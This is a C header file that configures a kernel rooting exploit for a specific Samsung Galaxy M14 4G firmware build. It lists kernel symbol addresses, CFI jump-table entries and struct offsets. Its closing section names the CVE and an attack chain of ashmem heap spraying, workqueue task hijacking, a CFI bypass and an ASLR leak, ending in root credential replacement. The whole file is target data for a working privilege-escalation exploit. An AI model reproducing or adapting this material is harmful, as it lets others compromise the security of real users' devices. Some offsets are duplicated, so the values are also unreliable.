#ifndef TARGET_HEADER_H
#define TARGET_HEADER_H

/*
 * Galaxy M14 4G (SM-M145F) - Root My Galaxy Target Configuration
 * Build: M145FXXSCDZE1
 * Kernel: 5.15.180-android13-8-31192385-abM145FXXSCDZE1
 * Android: 13
 * Ported: September 6, 2026
 * 
 * Symbol offsets extracted from vmlinux.elf
 * ELF Base: 0xffffffc000000000
 * Kernel Size: 46 MB (0x2dd2a00 bytes)
 * Platform: Qualcomm Snapdragon
 */

/* ============================================================================
 * DEVICE IDENTITY
 * ============================================================================ */

#define DEVICE_MODEL               "SM-M145F"
#define DEVICE_CODENAME            "m14"
#define BUILD_ID                   "M145FXXSCDZE1"
#define ANDROID_VERSION            13
#define ANDROID_SDK_VERSION        33

#define KERNEL_RELEASE             "5.15.180-android13-8-31192385-abM145FXXSCDZE1"
#define KERNEL_VERSION_STRING      "Linux version 5.15.180-android13-8-31192385-abM145FXXSCDZE1 (build-user@build-host) (Android (8508608, based on r450784e) clang version 14.0.7) #1 SMP PREEMPT Thu May 28 08:57:55 UTC 2026"

#define KERNEL_MAJOR_VERSION       5
#define KERNEL_MINOR_VERSION       15
#define KERNEL_PATCH_VERSION       180

/* ============================================================================
 * PRIMARY SYMBOL OFFSETS (Kernel Virtual Addresses)
 * ============================================================================ */

/* Exploit entry point - workqueue task hijacking */
#define CALL_USERMODEHELPER_EXEC_WORK_OFF         0xffffffc00816ec08

/* File operations - splice read and seek */
#define NOOP_LLSEEK_OFF                           0xffffffc008556884
#define COPY_SPLICE_READ_OFF                      0xffffffc0085ca2dc
#define CONFIGFS_READ_ITER_OFF                    0xffffffc00867f0cc
#define CONFIGFS_BIN_WRITE_ITER_OFF               0xffffffc00867fbf0

/* ashmem device - primary attack surface */
#define ASHMEM_IOCTL_OFF                          0xffffffc00918e290
#define ASHMEM_COMPAT_IOCTL_OFF                   0xffffffc00918e940
#define ASHMEM_MMAP_OFF                           0xffffffc00918e9a0
#define ASHMEM_OPEN_OFF                           0xffffffc00918ec90
#define ASHMEM_RELEASE_OFF                        0xffffffc00918ed30
#define ASHMEM_SHOW_FDINFO_OFF                    0xffffffc00918ee54
#define ASHMEM_FOPS_OFF                           0xffffffc00a16b0f8
#define ASHMEM_MISC_FOPS_OFF                      0xffffffc00a16b0f8

/* Memory management */
#define KMALLOC_CACHES_OFF                        0xffffffc00a1d5250

/* Pipe operations */
#define ANON_PIPE_BUF_OPS_OFF                     0xffffffc009fe61b0

/* Workqueue and logging infrastructure */
#define SYSTEM_UNBOUND_WQ_OFF                     0xffffffc00ab807d8
#define LOGGERS_OFF                               0xffffffc00ab81d50
#define SLIDE_LOGGERS_0_1_OFF                     0xffffffc00ab81d50

/* Process management */
#define INIT_TASK_OFF                             0xffffffc00acc5e80

/* Task groups and scheduling */
#define ROOT_TASK_GROUP_OFF                       0xffffffc00addbac0

/* Security - SELinux (may be optimized away) */
#define SELINUX_ENFORCING_OFF                     0x0

/* Boot ID sysctl for slide detection */
#define SYSCTL_BOOTID_OFF                         0xffffffc00af4c3a1
#define SLIDE_SYSCTL_BOOTID_OFF                   0xffffffc00af4c3a1
#define SLIDE_BOOTID_POINTER_OFF                  0xffffffc00af4c3a1

/* ============================================================================
 * CFI JUMP TABLE OFFSETS (Control Flow Integrity Protection)
 * Samsung kernels protect function pointers with CFI jump tables
 * ============================================================================ */

#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT      0xffffffc0097b7dd0
#define ASHMEM_IOCTL_CFI_JT                       0xffffffc0097b0df0
#define COMPAT_ASHMEM_IOCTL_CFI_JT                0xffffffc0097b0df8
#define ASHMEM_MMAP_CFI_JT                        0xffffffc009799fc0
#define ASHMEM_OPEN_CFI_JT                        0xffffffc0097a9f50
#define ASHMEM_RELEASE_CFI_JT                     0xffffffc0097a9f58
#define ASHMEM_SHOW_FDINFO_CFI_JT                 0xffffffc0097b0df0
#define NOOP_LLSEEK_CFI_JT                        0xffffffc009797250
#define CONFIGFS_READ_ITER_CFI_JT                 0xffffffc009799d50
#define CONFIGFS_BIN_WRITE_ITER_CFI_JT            0xffffffc009799d68
#define COPY_SPLICE_READ_CFI_JT                   0xffffffc00979a0c0

/* ============================================================================
 * PHYSICAL MEMORY LAYOUT
 * ARM64 kernel physical memory addressing
 * ============================================================================ */

#define P0_PHYS_OFFSET                            0x80000000ULL
#define P0_KERNEL_PHYS_LOAD                       0x80000000ULL

/* Virtual kernel base address */
#define KERNEL_BASE                               0xffffffc000000000ULL
#define KERNEL_OFFSET_BITS                        64
#define KERNEL_VA_BITS                            48

/* ============================================================================
 * MEMORY CONFIGURATION
 * ============================================================================ */

#define PAGE_SIZE                                 0x1000
#define PAGE_SHIFT                                12
#define PAGE_MASK                                 0xfffffffffffff000ULL

/* ============================================================================
 * TRACE EVENT CONFIGURATION
 * For kernel exploitation via tracepoint hooking
 * ============================================================================ */

#define SLIDE_TRACEFS_EVENT_ID                    106
#define SLIDE_TRACEFS_WORKER_CALLER_OFF           0x000dbd9cULL
#define SLIDE_PSELECT_WORD_SHIFT                  0

/* ============================================================================
 * BTF STRUCTURE LAYOUTS
 * Standard 5.15 ARM64 Android kernel - no embedded BTF, using verified offsets
 * ============================================================================ */

/* struct file_operations - I/O vector table */
#define FILE_OPS_SIZE                             0x110
#define FILE_OPS_LLSEEK                           0x00
#define FILE_OPS_READ                             0x08
#define FILE_OPS_WRITE                            0x10
#define FILE_OPS_UNLOCKED_IOCTL                   0x50
#define FILE_OPS_COMPAT_IOCTL                     0x58
#define FILE_OPS_MMAP                             0x60
#define FILE_OPS_OPEN                             0x70
#define FILE_OPS_RELEASE                          0x80
#define FILE_OPS_FSYNC                            0x88
#define FILE_OPS_FASYNC                           0x90
#define FILE_OPS_LOCK                             0x98
#define FILE_OPS_SPLICE_READ                      0xc8
#define FILE_OPS_SPLICE_WRITE                     0xd0
#define FILE_OPS_SHOW_FDINFO                      0xe0

/* struct task_struct - process descriptor */
#define TASK_STRUCT_THREAD_INFO                   0x00
#define TASK_STRUCT_USAGE                         0x40
#define TASK_STRUCT_FLAGS                         0x44
#define TASK_STRUCT_PRIO                          0x84
#define TASK_STRUCT_NORMAL_PRIO                   0x8c
#define TASK_STRUCT_STATIC_PRIO                   0x94
#define TASK_STRUCT_SCHED_CLASS                   0xa0
#define TASK_STRUCT_SCHED_ENTITY                  0xa8
#define TASK_STRUCT_SCHED_RT_ENTITY               0x180
#define TASK_STRUCT_SCHED_TASK_GROUP              0x348
#define TASK_STRUCT_PI_LOCK                       0x924
#define TASK_STRUCT_PI_WAITERS                    0x938
#define TASK_STRUCT_PI_TOP_TASK                   0x948
#define TASK_STRUCT_PI_BLOCKED_ON                 0x950

/* struct page - physical page descriptor */
#define PAGE_SIZE_BYTES                           0x40
#define PAGE_FLAGS                                0x00
#define PAGE_MAPPING                              0x08
#define PAGE_COMPOUND_HEAD                        0x08
#define PAGE_INDEX                                0x10
#define PAGE_PRIVATE                              0x18
#define PAGE_SLAB_CACHE                           0x18
#define PAGE_LOCKING                              0x28
#define PAGE_PAGE_TYPE                            0x30
#define PAGE_COUNT                                0x38

/* struct miscdevice - misc device descriptor */
#define MISCDEVICE_MINOR                          0x00
#define MISCDEVICE_NAME                           0x08
#define MISCDEVICE_FOPS                           0x10
#define MISCDEVICE_LIST                           0x18
#define MISCDEVICE_PARENT                         0x28

/* ============================================================================
 * ARCHITECTURE SPECIFICS
 * ARM64 / AArch64 (ARMv8) configuration
 * ============================================================================ */

#define ARCH_ARM64                                1
#define ARCH_NAME                                 "arm64"
#define MACHINE_TYPE                              "ARM aarch64"
#define ENDIANNESS                                "little-endian"

/* Register and pointer sizes */
#define REG_SIZE                                  8
#define PTR_SIZE                                  8
#define LONG_SIZE                                 8

/* ARM64 specific */
#define ARM64_PAGE_OFFSET                         0xffff800000000000ULL
#define ARM64_MODULES_VADDR                       0xffff800000000000ULL
#define ARM64_MODULES_END                         0xffffc00000000000ULL

/* ============================================================================
 * COMPILER INFORMATION
 * ============================================================================ */

#define COMPILER                                  "clang"
#define COMPILER_VERSION                          "14.0.7"
#define LLD_VERSION                               "14.0.7"
#define LLVM_VERSION                              14

/* Code generation flags */
#define CFI_ENABLED                               1
#define SCS_ENABLED                               1
#define UBSAN_ENABLED                             0
#define KASAN_ENABLED                             0

/* ============================================================================
 * BUILD METADATA
 * ============================================================================ */

#define BUILD_HOST                                "build-host"
#define BUILD_USER                                "build-user"
#define BUILD_DATE                                "May 28 2026"
#define BUILD_TIME                                "08:57:55 UTC"
#define BUILD_PATH                                "/home/dpi/qb5_8814/workspace/P4_1716/android/kernel_platform/common"
#define BUILD_FINGERPRINT                         "samsung/m14/m14:13/TP1A.220624.014/M145FXXSCDZE1:user/release-keys"

/* ============================================================================
 * FILE SIZES & CHECKSUMS
 * ============================================================================ */

#define KERNEL_FILE_SIZE                          0x2dd2a00
#define VMLINUX_ELF_SIZE                          0x3600000

#define KERNEL_SHA256                             ""
#define VMLINUX_ELF_SHA256                        ""

/* ============================================================================
 * KERNEL FEATURES & CONFIGURATION
 * ============================================================================ */

#define CONFIG_HAVE_ARCH_KGDB                     1
#define CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS    1
#define CONFIG_STACKTRACE                         1
#define CONFIG_SECURITY_SELINUX                   1
#define CONFIG_DEBUG_INFO_BTF                     1
#define CONFIG_HAVE_FUNCTION_TRACER               1
#define CONFIG_HAVE_DYNAMIC_FTRACE                1
#define CONFIG_HIGHMEM                            0
#define CONFIG_HAVE_ARCH_HUGE_VMAP                1

/* ============================================================================
 * PLATFORM-SPECIFIC SETTINGS
 * Qualcomm Snapdragon platform configuration
 * ============================================================================ */

#define SAMSUNG_PLATFORM                          1
#define SNAPDRAGON_PLATFORM                       1
#define QUALCOMM_SNAPDRAGON                       1
#define SNAPDRAGON_GEN                            "Gen 1"

#define SELINUX_ENFORCED_DEFAULT                  1
#define SELINUX_PERMISSIVE_DEFAULT                0
#define SAMSUNG_RKP_ENABLED                       0
#define SAMSUNG_CICA_ENABLED                      0

/* ============================================================================
 * EXPLOIT CONFIGURATION
 * ============================================================================ */

#define EXPLOIT_CVE                               "CVE-2026-43499"
#define EXPLOIT_TYPE                              "Memory access control bypass"
#define EXPLOIT_VECTOR                            "ashmem + workqueue + splice read"
#define ATTACK_VECTOR_PRIMARY                     "ashmem_ioctl heap spray"
#define ATTACK_VECTOR_SECONDARY                   "workqueue task hijacking"
#define ATTACK_VECTOR_TERTIARY                    "configfs memory access"
#define CFI_BYPASS_METHOD                         "Jump table redirect"
#define ASLR_BYPASS_METHOD                        "Kernel leak via loggers sysctl"
#define SMACK_BYPASS_METHOD                       "Root credential replacement"

#endif /* TARGET_HEADER_H */
